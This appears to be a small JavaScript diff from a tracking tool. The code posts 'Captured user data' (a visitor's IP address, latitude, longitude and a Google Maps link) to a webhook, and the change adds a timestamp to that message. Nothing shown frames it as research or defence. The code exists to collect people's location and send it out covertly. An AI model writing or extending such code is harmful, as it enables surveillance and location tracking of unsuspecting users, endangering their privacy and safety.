@@ -258,7 +258,7 @@
         formData.append(
           "payload_json",
           JSON.stringify({
-            content: `Captured user data:\n- IP Address: ${ip}\n- Latitude: ${latitude}\n- Longitude: ${longitude}\n[Google Maps Location](${mapsLink})`,
+            content: `Captured user data:\n- IP Address: ${ip}\n- Latitude: ${latitude}\n- Longitude: ${longitude}\n[Google Maps Location](${mapsLink})\n- time: ${new Date().toISOString()}`,
           })
         );
         const response = await fetch(webhookURL, { method: "POST", body: formData });
